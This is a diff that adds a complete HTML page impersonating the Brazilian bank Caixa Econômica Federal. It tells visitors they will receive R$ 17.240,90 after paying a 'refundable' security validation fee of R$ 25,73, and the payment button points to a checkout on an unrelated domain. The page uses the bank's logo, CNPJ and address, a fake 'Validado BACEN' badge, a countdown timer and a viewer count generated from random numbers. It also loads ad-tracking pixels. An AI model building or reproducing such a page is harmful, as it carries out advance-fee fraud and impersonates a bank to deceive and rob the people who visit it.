@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caixa - Validação de Segurança</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    
+    <script>
+  window.pixelId = "67bfd5a4c8a2fac92017855f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'caixa-blue': '#005CA9',
+                        'caixa-orange': '#F7941E',
+                        'success-green': '#10B981'
+                    }
+                }
+            }
+        }
+
+        // Função para atualizar o contador de visualizações
+        function updateViewerCount() {
+            const viewerElement = document.getElementById('viewer-count');
+            const currentCount = parseInt(viewerElement.textContent);
+            const variation = Math.floor(Math.random() * 3) - 1;
+            const newCount = Math.max(120, Math.min(135, currentCount + variation));
+            viewerElement.textContent = newCount;
+        }
+
+        // Função para atualizar o timer
+        function updateTimer() {
+            const timerElement = document.getElementById('timer');
+            let [minutes, seconds] = timerElement.textContent.split(':').map(Number);
+            
+            if (seconds > 0) {
+                seconds--;
+            } else if (minutes > 0) {
+                minutes--;
+                seconds = 59;
+            }
+            
+            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (minutes === 0 && seconds === 0) {
+                clearInterval(timerInterval);
+            }
+        }
+
+        window.onload = function() {
+            setInterval(updateViewerCount, 3000);
+            const timerInterval = setInterval(updateTimer, 1000);
+        }
+    </script>
+</head>
+<body class="bg-gray-50">
+    <!-- Header com gradiente sutil -->
+    <header class="bg-gradient-to-b from-white to-gray-50 border-b border-gray-200">
+        <div class="container mx-auto py-4 px-4">
+            <div class="flex justify-between items-center">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png" 
+                     alt="Caixa Econômica Federal" 
+                     class="h-8 md:h-10">
+                <div class="flex items-center space-x-2 bg-green-50 text-success-green px-3 py-1 rounded-full text-sm">
+                    <i class="fas fa-shield-check"></i>
+                    <span>Ambiente Seguro</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="container mx-auto px-4 py-6 md:py-12">
+        <div class="max-w-3xl mx-auto">
+            <!-- Status Bar -->
+            <div class="mb-8">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-sm text-gray-600">Progresso da Validação</span>
+                    <span class="text-sm font-semibold text-success-green">80% Concluído</span>
+                </div>
+                <div class="h-2 bg-gray-200 rounded-full">
+                    <div class="h-2 bg-success-green rounded-full" style="width: 80%"></div>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="bg-white rounded-xl shadow-lg overflow-hidden">
+                <!-- Header Section -->
+                <div class="bg-gradient-to-r from-caixa-blue to-blue-700 text-white p-6 md:p-8">
+                    <div class="flex flex-col md:flex-row md:items-center md:justify-between">
+                        <div>
+                            <h1 class="text-2xl md:text-3xl font-bold mb-2">
+                                Validação Final de Segurança
+                            </h1>
+                            <p class="text-blue-100">
+                                Valor a Receber: <span class="font-bold text-xl">R$ 17.240,90</span>
+                            </p>
+                        </div>
+                        <div class="mt-4 md:mt-0 bg-white/10 rounded-lg p-3 text-center">
+                            <p class="text-sm text-blue-100">Tempo Restante</p>
+                            <div class="font-mono text-xl font-bold" id="timer">15:00</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Content Section -->
+                <div class="p-6 md:p-8">
+                    <!-- Alert Box -->
+                    <div class="bg-blue-50 border-l-4 border-caixa-blue p-4 mb-6 rounded-r">
+                        <div class="flex">
+                            <div class="flex-shrink-0">
+                                <i class="fas fa-info-circle text-caixa-blue text-xl"></i>
+                            </div>
+                            <div class="ml-3">
+                                <h3 class="text-sm font-medium text-caixa-blue">
+                                    Validação em Andamento
+                                </h3>
+                                <p class="text-sm text-blue-700 mt-1">
+                                    Seu processo está em análise final. Para concluir a liberação do valor, é necessário validar a transação através da taxa de segurança.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Security Features -->
+                    <div class="grid md:grid-cols-2 gap-6 mb-8">
+                        <div class="flex items-start space-x-4">
+                            <div class="bg-green-50 p-2 rounded-lg">
+                                <i class="fas fa-fingerprint text-success-green text-xl"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-semibold text-gray-800">Validação Biométrica</h3>
+                                <p class="text-sm text-gray-600">Sistema de segurança avançado para proteção contra fraudes</p>
+                            </div>
+                        </div>
+                        <div class="flex items-start space-x-4">
+                            <div class="bg-green-50 p-2 rounded-lg">
+                                <i class="fas fa-shield-alt text-success-green text-xl"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-semibold text-gray-800">Protocolo SSL</h3>
+                                <p class="text-sm text-gray-600">Criptografia de ponta a ponta em todas as transações</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Validation Box -->
+                    <div class="bg-gray-50 rounded-lg p-6 mb-8 border border-gray-200">
+                        <div class="text-center mb-4">
+                            <h2 class="text-xl font-bold text-gray-800 mb-2">Taxa de Validação de Segurança</h2>
+                            <p class="text-gray-600 text-sm">Valor 100% reembolsável após confirmação</p>
+                        </div>
+                        <div class="flex justify-center items-baseline space-x-2 mb-4">
+                            <span class="text-3xl font-bold text-caixa-blue">R$ 25,73</span>
+                        </div>
+                        <ul class="space-y-3 mb-6">
+                            <li class="flex items-center text-sm text-gray-600">
+                                <i class="fas fa-check-circle text-success-green mr-2"></i>
+                                Liberação instantânea após validação
+                            </li>
+                            <li class="flex items-center text-sm text-gray-600">
+                                <i class="fas fa-check-circle text-success-green mr-2"></i>
+                                Processo 100% seguro e regulamentado
+                            </li>
+                            <li class="flex items-center text-sm text-gray-600">
+                                <i class="fas fa-check-circle text-success-green mr-2"></i>
+                                Reembolso garantido da taxa
+                            </li>
+                        </ul>
+                    </div>
+
+                    <!-- CTA Section -->
+                    <div class="text-center">
+                        <a href="https://go.disruptybr.com.br/lkhpiqhhib?upsell=true&" 
+                           class="block w-full md:w-auto md:inline-block bg-caixa-orange hover:bg-orange-600 text-white font-bold py-4 px-8 rounded-lg text-lg transition-all transform hover:scale-105 shadow-lg mb-4">
+                            VALIDAR E LIBERAR MEU VALOR
+                            <i class="fas fa-lock ml-2"></i>
+                        </a>
+                        <div class="flex justify-center items-center space-x-6 text-sm text-gray-500">
+                            <div class="flex items-center">
+                                <i class="fas fa-users text-caixa-blue mr-2"></i>
+                                <span><span id="viewer-count">127</span> validações em andamento</span>
+                            </div>
+                            <div class="flex items-center">
+                                <i class="fas fa-shield-alt text-success-green mr-2"></i>
+                                <span>Ambiente Verificado</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Trust Badges -->
+            <div class="mt-8 grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
+                <div class="bg-white p-4 rounded-lg shadow-sm">
+                    <i class="fas fa-lock text-caixa-blue text-xl mb-2"></i>
+                    <p class="text-xs text-gray-600">Certificado de Segurança</p>
+                </div>
+                <div class="bg-white p-4 rounded-lg shadow-sm">
+                    <i class="fas fa-shield-alt text-caixa-blue text-xl mb-2"></i>
+                    <p class="text-xs text-gray-600">Proteção SSL</p>
+                </div>
+                <div class="bg-white p-4 rounded-lg shadow-sm">
+                    <i class="fas fa-check-circle text-caixa-blue text-xl mb-2"></i>
+                    <p class="text-xs text-gray-600">Validado BACEN</p>
+                </div>
+                <div class="bg-white p-4 rounded-lg shadow-sm">
+                    <i class="fas fa-fingerprint text-caixa-blue text-xl mb-2"></i>
+                    <p class="text-xs text-gray-600">Verificação Digital</p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="bg-gray-800 text-white py-4 mt-12">
+        <div class="container mx-auto px-4 text-center">
+            <p class="text-sm text-gray-400">&copy; 2024 Caixa Econômica Federal. Todos os direitos reservados.</p>
+            <div class="mt-2 text-xs text-gray-500">
+                <span>CNPJ: 00.360.305/0001-04</span> • 
+                <span>Matriz: SBS Quadra 4, Bloco A, Lote 3/4, Brasília/DF</span>
+            </div>
+        </div>
+    </footer>
+</body>
+</html> 
